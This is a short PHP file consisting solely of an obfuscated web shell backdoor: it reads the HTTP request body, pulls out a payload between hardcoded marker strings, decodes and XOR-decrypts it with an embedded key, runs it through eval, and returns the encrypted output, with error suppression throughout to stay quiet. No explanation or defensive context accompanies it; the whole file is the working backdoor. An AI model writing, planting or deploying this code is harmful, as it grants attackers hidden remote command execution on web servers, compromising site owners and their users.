<?php
$E = create_function('','
$k="7ccf8192";
$kh="528271413977";
$kf="f541527062a9";
$p="ie3xNV9ea8twe7wl";
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}
if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
    $o=@ob_get_contents();
    @ob_end_clean();
    $r=@base64_encode(@x(@gzcompress($o),$k));
    print("$p$kh$r$kf");
}
');
$E();
?>
